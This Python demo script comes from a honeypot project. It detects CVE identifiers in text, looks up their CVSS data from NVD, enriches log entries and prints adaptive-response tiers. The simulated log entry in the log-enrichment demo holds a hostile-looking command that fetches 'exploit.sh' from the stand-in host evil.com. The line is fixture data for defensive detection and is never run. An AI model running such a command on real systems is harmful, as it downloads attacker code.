#!/usr/bin/env python3
"""
Demo script for CVE enrichment functionality.
Shows how to detect CVEs in text and retrieve enrichment data.

This can be run standalone or integrated into other components.
"""

import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from api.cve_enrichment import extract_cves, fetch_cve_from_nvd, enrich_log_with_cves


def demo_cve_detection():
    """Demonstrate CVE detection from text."""
    print("=" * 60)
    print("CVE DETECTION DEMO")
    print("=" * 60)

    test_texts = [
        "Attempting to exploit CVE-2021-44228",
        "Multiple CVEs detected: CVE-2020-1234, CVE-2019-5678",
        "No vulnerabilities in this text",
        "Script uses CVE-2021-44228 and also CVE-2021-44228 again",
    ]

    for text in test_texts:
        cves = extract_cves(text)
        print(f"\nText: {text}")
        print(f"CVEs found: {cves if cves else 'None'}")


def demo_cve_enrichment():
    """Demonstrate CVE enrichment with NVD data."""
    print("\n" + "=" * 60)
    print("CVE ENRICHMENT DEMO")
    print("=" * 60)

    # Note: This will make a real API call to NVD
    # Use a well-known CVE for testing
    test_cve = "CVE-2021-44228"  # Log4Shell

    print(f"\nFetching enrichment data for {test_cve}...")
    print("(This may take a few seconds...)")

    enrichment = fetch_cve_from_nvd(test_cve)

    if enrichment:
        print(f"\n✓ Successfully enriched {test_cve}")
        print(f"  - Status: {enrichment.get('enrichment_status', 'unknown')}")
        print(f"  - CVSS Score: {enrichment.get('cvss_base_score', 'N/A')}")
        print(f"  - Severity: {enrichment.get('cvss_severity', 'N/A')}")
        print(f"  - CVSS Version: {enrichment.get('cvss_version', 'N/A')}")
        print(f"  - Vector: {enrichment.get('cvss_vector', 'N/A')}")
        desc = enrichment.get("cve_description", "")
        print(f"  - Description: {desc[:100]}..." if len(desc) > 100 else f"  - Description: {desc}")
    else:
        print(f"\n✗ Failed to enrich {test_cve}")


def demo_log_enrichment():
    """Demonstrate log entry enrichment."""
    print("\n" + "=" * 60)
    print("LOG ENRICHMENT DEMO")
    print("=" * 60)

    # Simulate a honeypot log entry
    log_entry = {
        "timestamp": "2024-01-15T10:30:00Z",
        "src_ip": "192.168.1.100",
        "message": "Exploit attempt detected",
        "command": "wget http://evil.com/exploit.sh && CVE-2021-44228",
        "event_category": "command_execution",
        "anomaly_score": 25,
    }

    print("\nOriginal log entry:")
    for key, value in log_entry.items():
        print(f"  {key}: {value}")

    print("\nEnriching log entry...")
    enriched = enrich_log_with_cves(log_entry)

    if enriched.get("cve_detected"):
        print("\n✓ CVE detected and enriched!")
        print(f"  - CVE IDs: {enriched.get('cve_ids', [])}")
        print(f"  - Max CVSS Score: {enriched.get('max_cvss_score', 'N/A')}")
        print(f"  - Severity: {enriched.get('cve_severity', 'N/A')}")
        print(f"  - Number of enrichments: {len(enriched.get('cve_enrichments', []))}")

        # Show first enrichment details
        if enriched.get("cve_enrichments"):
            first_cve = enriched["cve_enrichments"][0]
            print(f"\n  First CVE details:")
            print(f"    - CVE ID: {first_cve.get('cve_id', 'N/A')}")
            print(f"    - CVSS: {first_cve.get('cvss_base_score', 'N/A')}")
            print(f"    - Status: {first_cve.get('enrichment_status', 'N/A')}")
    else:
        print("\n✗ No CVEs detected in log entry")


def demo_adaptive_response():
    """Demonstrate how adaptive responses are triggered."""
    print("\n" + "=" * 60)
    print("ADAPTIVE RESPONSE DEMO")
    print("=" * 60)

    scenarios = [
        {"cvss": 10.0, "severity": "CRITICAL"},
        {"cvss": 8.5, "severity": "HIGH"},
        {"cvss": 5.0, "severity": "MEDIUM"},
        {"cvss": 2.0, "severity": "LOW"},
    ]

    print("\nAdaptive Response Thresholds:")
    print("-" * 60)

    for scenario in scenarios:
        cvss = scenario["cvss"]
        severity = scenario["severity"]

        print(f"\nCVSS Score: {cvss} ({severity})")

        if cvss >= 9.0:
            print("  → CRITICAL RESPONSE:")
            print("    • Deploy specialized high-interaction honeypots")
            print("    • Redirect attacker to isolated decoy")
            print("    • Enable maximum monitoring (verbose logging)")
            print("    • Trigger infrastructure scaling via Terraform")
            print("    • Alert security team immediately")
        elif cvss >= 7.0:
            print("  → HIGH RESPONSE:")
            print("    • Scale up honeypot instances (1.5x)")
            print("    • Deploy medium-interaction honeypots")
            print("    • Elevate monitoring levels")
            print("    • Trigger infrastructure updates")
        elif cvss >= 4.0:
            print("  → MEDIUM RESPONSE:")
            print("    • Enhanced logging enabled")
            print("    • Standard monitoring continues")
        else:
            print("  → LOW RESPONSE:")
            print("    • Log event for analysis")
            print("    • No adaptive infrastructure changes")


def main():
    """Run all demos."""
    print("\n")
    print("╔" + "=" * 58 + "╗")
    print("║" + " " * 10 + "CVE/CVSS ENRICHMENT DEMO" + " " * 24 + "║")
    print("║" + " " * 15 + "asy1um Honeypot System" + " " * 22 + "║")
    print("╚" + "=" * 58 + "╝")

    try:
        # Run demos
        demo_cve_detection()
        demo_adaptive_response()

        # Ask before making API calls
        print("\n" + "=" * 60)
        print("LIVE API CALL DEMOS")
        print("=" * 60)
        print("\nThe following demos will make real API calls to NVD.")
        print("This may take a few seconds and count toward rate limits.")

        response = input("\nProceed with live API demos? (y/N): ").strip().lower()

        if response == "y":
            demo_cve_enrichment()
            demo_log_enrichment()
        else:
            print("\nSkipping live API demos.")

    except KeyboardInterrupt:
        print("\n\nDemo interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n✗ Error during demo: {e}")
        sys.exit(1)

    print("\n" + "=" * 60)
    print("Demo complete!")
    print("=" * 60)
    print("\nFor more information, see:")
    print("  - docs/cve-integration.md")
    print("  - API documentation at http://localhost:8000/docs")
    print("\n")


if __name__ == "__main__":
    main()
